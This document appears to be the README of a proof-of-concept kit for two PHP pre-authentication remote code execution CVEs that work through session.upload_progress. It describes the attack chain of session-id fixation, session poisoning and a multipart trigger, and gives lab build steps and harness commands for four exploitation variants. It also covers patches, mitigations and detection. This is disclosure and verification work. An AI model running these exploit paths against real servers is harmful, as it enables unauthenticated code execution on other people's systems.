# CVE-2026-109618 / CVE-2026-109619 — PHP upload-progress RCE (PoC)

Two critical pre-authentication remote code execution vulnerabilities in PHP,
exploiting `session.upload_progress` (enabled by default since PHP 5.4) and a
request-state lifetime bug in the Zend engine.

**Author:** Joshua Rosato
**License:** Apache 2.0 — see [`LICENSE`](LICENSE).
**Companion documents:** [`GUIDE.md`](GUIDE.md) (step-by-step lab reproduction),
[`DETAILS.md`](DETAILS.md) (root cause, exploit variants, carriers, remediation,
detection, scope/limits).

---

## At a glance

| CVE | GHSA | What it is |
|---|---|---|
| CVE-2026-109618 | GHSA-w8hw-w9fx-j79w | RCE via inconsistent request state after an OOM bailout — the shutdown path consumes state that the error path left half-initialized. |
| CVE-2026-109619 | GHSA-6wmf-4rv5-p3rp | RCE via stale request-owned global state — state that should be per-request survives into the next request and is consumed before the next request's init. |

For both, the **reachable consumer is the `session.upload_progress` handler**, which
unserializes session data during request startup — **before any application code runs**.
One unauthenticated multipart request can yield command execution with the privileges
of the PHP worker.

**Impact scales with the worker's privileges.** A normal unprivileged worker gives an
unprivileged shell; a root worker (Apache started as root, an over-privileged FPM pool,
a root container) gives root.

**Patch:** php-src commit [`3584a98b`](https://github.com/php/php-src/commit/3584a98bda)
("Avoid state corruption via bailout"). Fixed releases: **PHP 8.5.12 / 8.4.27 /
8.3.36 / 8.2.35** (2026-10-21). EOL branches (PHP ≤ 8.1) receive no official fix;
treat them as permanently vulnerable and isolate or upgrade.

---

## What this repo is / is not

This repo is a **verification proof-of-concept kit**:

- It reproduces the primary, reliable path (session poisoning → upload-progress
  trigger → gadget runs at request startup) in a local lab.
- It ships a **consolidated best-version harness** (`poc_rce.py`) covering four
  exploitation variants against the same root cause, plus a differential
  verification mode.
- It includes the auxiliary corpus (`poc.py`, `poc_stale_state.py`,
  `poc_heap_spray.py`, `fcgi_client.py`) and a symbol-extraction tool
  (`symextract.py`) for the build-specific memory-corruption path.

**It is not a turnkey exploit against arbitrary stock endpoints without a reachable
gadget or sink.** The variants that don't require a gadget class (memory-corruption,
handler-mismatch, include-sink) have specific preconditions; `DETAILS.md` says
exactly which.

---

## Affected versions (summary)

| Branch | Status | Fixed version |
|---|---|---|
| PHP 8.5 | supported | **8.5.12** |
| PHP 8.4 | supported | **8.4.27** |
| PHP 8.3 | supported | **8.3.36** |
| PHP 8.2 | security-fix only | **8.2.35** |
| PHP 8.1 and older EOL | unsupported | no official patch — isolate / self-build official backports / upgrade |

The "≥ 5.4" surface claim traces to the upload-progress feature existing since
PHP 5.4.0 and to widely-distributed PoC banners; the **official fixes** are for
8.2–8.5. See `DETAILS.md` §1 for the nuance.

---

## How the exploit works (short version)

1. The attacker fixes a session id via the `PHPSESSID` **form field** — this works
   even when `session.use_only_cookies=1`, because the field is read during request
   startup, before script resolution.
2. The attacker gets attacker-controlled content into the session store — by a direct
   session-write primitive, by an application that stores user input in `$_SESSION`,
   or by a filename-injection path.
3. The attacker sends one multipart request carrying `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS`
   + a file part. PHP engages the upload-progress handler during request startup,
   loads the session, unserializes the stored content, and runs `__wakeup()` / `__destruct()`
   on whatever object shapes it contains.
4. The result is command execution as the web worker, **before the application script
   ever executes**.

`DETAILS.md` §§5–6 covers the four exploitation variants and the carrier constraints
(what survives the session-encode round-trip and what does not).

---

## What's in the repo

```
php-poc/
├── README.md                  # this file — public-facing overview
├── GUIDE.md                   # step-by-step lab reproduction (real outputs)
├── DETAILS.md                 # root cause, variants, carriers, remediation, detection
├── LICENSE                    # Apache 2.0
├── poc_rce.py                 # consolidated best-version harness (4 variants + verify)
├── symextract.py              # ELF64 .dynsym reader — extract zval_ptr_dtor / zend_call_function
├── poc.py                     # CVE-2026-109618 OOM/stall trigger (FPM + HTTP) + stale-state driver
├── poc_stale_state.py         # producer/consumer UAF proof (dangling-pointer reuse)
├── poc_heap_spray.py          # heap-grooming variant (spray the freed bin-80 chunk)
├── fcgi_client.py             # minimal FastCGI client used by poc.py
└── lab/                       # build scripts, config, victim scripts, gadget source
    ├── build_vuln_php.sh
    ├── build_gadget.sh
    ├── run_lab.sh [port]
    ├── verify_patched.sh
    ├── run_root_lab.sh
    ├── start.sh
    ├── lab.ini
    ├── php.ini
    ├── fpm.conf
    ├── index.php / consumer.php / producer.php
    ├── gadget/
    │   ├── pwn.c
    │   └── config.m4
    └── gdb_stale_state.cmd
```

The `lab/` tree is the local reproduction environment. `GUIDE.md` walks through it.

---

## Quick start (build the vulnerable lab and run the PoC)

These steps build a vulnerable PHP 8.5, the gadget extension, start the lab, and
run the PoC. Full detail and troubleshooting are in `GUIDE.md`.

```bash
# 1. build the vulnerable PHP 8.5 (pre-fix)
./lab/build_vuln_php.sh

# 2. build the gadget extension (a class whose __wakeup() runs a command)
./lab/build_gadget.sh

# 3. start the lab and run the PoC
./lab/run_lab.sh 9032

# 4. differential verification: vulnerable vs patched
./lab/verify_patched.sh
```

Expected (vulnerable build): the `Pwn::__wakeup()` notice appears during "PHP
Request Startup", i.e. before the application script. Expected (patched build):
the object becomes `__PHP_Incomplete_Class` and `__wakeup()` is never called.

---

## Running the harness (`poc_rce.py`)

```bash
# 1. Session poisoning (the primary, reproduced path)
python3 poc_rce.py --url http://127.0.0.1:9032/ \
    --sid abcdef0123456789abcdef0123456789 \
    --session-path /tmp/poc-lab/sessions/sess_abcdef0123456789abcdef0123456789

# 2. Handler-mismatch (two .user.ini handlers sharing one session dir)
python3 poc_rce.py --url http://127.0.0.1:9066/ \
    --sid abcdef0123456789abcdef0123456789 \
    --mode mismatch --write-endpoint /app/seed.php --read-endpoint /api/trigger.php

# 3. Include-sink (gadget-class-free; session value fed to an include/eval sink)
python3 poc_rce.py --url http://127.0.0.1:9032/ \
    --sid abcdef0123456789abcdef0123456789 \
    --mode include --sink /var/www/html/inc/render.php

# 4. Memory-corrupt / CVE-2026-109618 (build-specific; needs leaked address)
python3 symextract.py --binary /tmp/php-vuln85/sbin/php-fpm
python3 poc_rce.py --url http://127.0.0.1:9032/ \
    --sid abcdef0123456789abcdef0123456789 \
    --mode corrupt --call 0x<runtime_zend_call_function> --cmd 'id'

# 5. Differential verification — same flow against the patched build
python3 poc_rce.py --url http://127.0.0.1:9042/ \
    --sid abcdef0123456789abcdef0123456789 --verify-patch
```

Run `python3 poc_rce.py --help` for the full option set.

---

## Remediation

**Patch** — 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 (or a vendor backport / distro
package). This is the only complete fix.

Until patched, reduce exposure **administratively and before request parsing**
(i.e. in the pool config / Apache config / php.ini — not via `ini_set()` or
`.user.ini`, which are too late):

- `session.upload_progress.enabled = 0` — disables the reachable consumer.
  Restart every worker after changing.
- On PHP 8.5: `fatal_error_backtraces = 0`.
- `memory_limit = -1` administered by the pool/Apache config removes the
  controllable OOM path (CVE-2026-109618). Do **not** use `RLIMIT_AS` /
  `RLIMIT_DATA` — those make `mmap()` fail and hit the vulnerable `longjmp()` path.

Reduce blast radius:

- Run the PHP worker as a low-privilege user, never as root.
- Use separate session save paths per application where possible.
- Audit the application for `$_SESSION` writes of user input — that's the
  primitive that turns the startup-time unserialize into code execution.
- Audit for gadget classes (framework classes with dangerous `__wakeup()` /
  `__destruct()`).

What **not** to rely on:

- `session.use_only_cookies=1` does **not** stop the `PHPSESSID` form-field path.
- Application-level input validation / WAF rules on the application route do **not**
  help — the exploit runs before the script.
- `.user.ini` and `ini_set()` are too late to disable the upload-progress handler
  for the current request.

See `DETAILS.md` §9 for the full mitigation section.

---

## Detection guidance (short)

See `DETAILS.md` §10 for full detail. Key signals:

- `session.upload_progress.enabled=1` in the effective PHP config (the default).
- Session files containing unexpected serialized objects, or a `|` in a key where
  the stored handler is `php` (suggests mismatch/injection).
- Unexpected session-file writes from unauthenticated endpoints.
- FPM child exits with code 70 / `Allowed memory size exhausted` during request
  startup, correlated with large multipart requests.
- In the debug lab build, the Zend MM debug allocator reporting frees of
  request-owned memory in the consumer request.

---

## Build notes

- PHP ≥ 8.5 exports a `ZEND_VM_KIND` constant that breaks `zend_vm_gen.php`;
  the build script regenerates the VM sources using a containerised PHP 8.3.
- `re2c` is required to configure PHP.
- `--enable-debug` matters for the stale-state proof (the Zend MM debug
  allocator reports the corruption).

The vulnerable build ends up at `/tmp/php-vuln85`; the patched build at
`/tmp/php-patched`; the gadget extension at `/tmp/ext-pwn/modules/pwn.so`.

---

## License & author

Copyright 2026 Joshua Rosato.

Licensed under the Apache License, Version 2.0 (the "License"); you may not use
this file except in compliance with the License. You may obtain a copy of the
License at <http://www.apache.org/licenses/LICENSE-2.0>.

Unless required by applicable law or agreed to in writing, software distributed
under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
CONDITIONS OF ANY KIND, either express or implied. See the License for the
specific language governing permissions and limitations under the License.

Author: Joshua Rosato.
